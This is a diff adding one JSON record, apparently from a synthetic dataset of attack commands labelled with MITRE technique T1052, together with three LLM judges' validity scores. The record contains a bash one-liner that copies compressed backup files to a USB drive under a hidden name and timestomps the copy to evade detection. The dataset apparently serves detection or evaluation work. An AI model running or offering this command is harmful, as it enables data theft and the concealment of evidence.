@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(lsblk -pn -o NAME,TRAN | awk \"$2==\\\"usb\\\"{print $1\\\"1\\\"}\" | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && gzip -c /var/backups/*.bak > /mnt/usb/.bkp.gz && touch -r /bin/ls /mnt/usb/.bkp.gz && sync && umount /mnt/usb'",
+  "explanation": "Mounts a USB partition and streams gzip-compressed backup files to it, then aligns the file timestamp to blend with system files, operating solely on physical media.",
+  "rationale_steps": [
+    "Detect and mount the USB partition locally.",
+    "Use gzip to compress local backup files.",
+    "Copy the compressed data to the USB device.",
+    "Adjust timestamps to reduce attention and unmount.",
+    "No network resources are engaged."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-8a19f9cc",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper separators, and valid flags, though the AWK segment uses double quotes causing $1/$2 to be expanded by the shell (a semantic pitfall, not a parse error).",
+        "semantic_score": 3,
+        "semantic_justification": "It intends to mount a USB, compress and write backups, timestomp, and unmount (aligning with T1052), but the AWK quoting likely fails to identify the USB partition and the use of sudo contradicts the 'Privilege: None' claim, making successful exfiltration unreliable.",
+        "combined_score": 4.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T08:23:07.604404Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate variable usage throughout the bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by identifying a USB device, mounting it, exfiltrating backup files with compression, hiding the data with a dot-prefixed filename, manipulating timestamps to evade detection, and properly unmounting the device.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:23:10.467698Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, featuring balanced quoting, proper command separators, and valid flag formats throughout its execution string, correctly handling inner escaped quotes for `awk`.",
+        "semantic_score": 4,
+        "semantic_justification": "The command largely achieves its claimed intent of exfiltrating compressed files to a USB with timestamp obfuscation, but its USB partition identification logic is a common heuristic and not entirely robust for all scenarios.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:23:30.526965Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
